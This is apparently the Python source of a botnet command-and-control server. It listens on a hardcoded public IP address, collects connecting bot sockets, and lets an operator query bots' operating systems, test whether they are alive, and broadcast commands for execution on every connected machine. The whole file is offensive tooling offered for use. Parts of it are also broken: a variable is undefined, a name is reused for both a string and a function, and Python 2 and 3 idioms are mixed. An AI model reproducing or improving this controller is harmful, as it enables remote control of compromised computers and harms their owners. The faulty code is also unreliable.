import socket
import struct
from threading import Thread
from time import sleep
import sys

botnet = {} #Botnet dictionary
exec_command = "null"
on_connect_exit = False
test_bool = False

#def check_bot(addr):
#    global botnet_address
#    for add in botnet_address:
#        if(add == addr):
#            return True
#    return False

def start_server(port=2003,ip="142.93.197.240"):
    global botnet,exec_command,on_connect_exit
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(5)
    print("\n[*] Server Started!\n")
    while True:
        try:
            bot,addr = s.accept()
            botnet[str(addr[0])] = bot
            if(botnet.get(str(addr[0]))):
                print("[*] New bot %s"%(str(addr[0])))
                print(">>")
        except socket.error:
            pass

def test_conn(bot,addr):
    bot.send("CHECK".encode())
    resp = bot.recv(1024).decode()
    if(resp == "YES"):
        print("[*] %s : Active"%(addr))
        global test_bool
        test_bool = True

def test_bots():
    global botnet
    for bot in botnet:
        bot_test_thread = Thread(target=test_conn,args=(botnet[bot],bot))
        bot_test_thread.start()
        sleep(5)
        global test_bool
        if(test_bool == False):
            print("[*] %s : Dead"%(bot))

def detect_os():
    global botnet
    #Build a dictionary of botnet addresses and sock connections
    for bot in botnet:
        botnet[bot].send("OS".encode())
        bot_os = botnet[bot].recv(1024).decode()
        print("\nDetails for %s : "%(str(bot)))
        print(bot_os)
        print("\n\n\n\n")

def exec_command(cmd):
    global botnet
    print("[*] Sending Command Packets...")
    sleep(1)
    for bot in botnet:
        botnet[bot].send(cmd.encode())
        #cmd_size = len(cmd)
        #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
        #bot.send(packet)
        #print("[*] Command packet sent")

def process_cmd(cmd):
    global botnet,botnet_address
    sleep(1)
    if(cmd == "show botnet"):
        count = 1
        for bot in botnet_address:
            print("[*] %d : %s"%(count,str(bot)))
            count += 1
    if 'execute' in cmd:
        #cmd = cmd.strip("execute ")
        exec_command(cmd)
        print("[*] Command packets sent!")
    if(cmd == "get os"):
        detect_os()
    if 'test' in cmd:
        cmd = cmd.strip("test ")
        t1 = Thread(target=test_bots,args=())
        t1.start()
        pass

def main():
    try:
        listener_thread = Thread(target=start_server,args=())
        listener_thread.start()
        sleep(2)
        while True:
            cmd = raw_input(">>")
            command_thread = Thread(target=process_cmd,args=(cmd,))
            command_thread.start()
            print("[*] Processing command")
    except KeyboardInterrupt:
        print("[*] Botnet Terminated!")
        sys.exit(0)

if __name__ == '__main__':
    main()
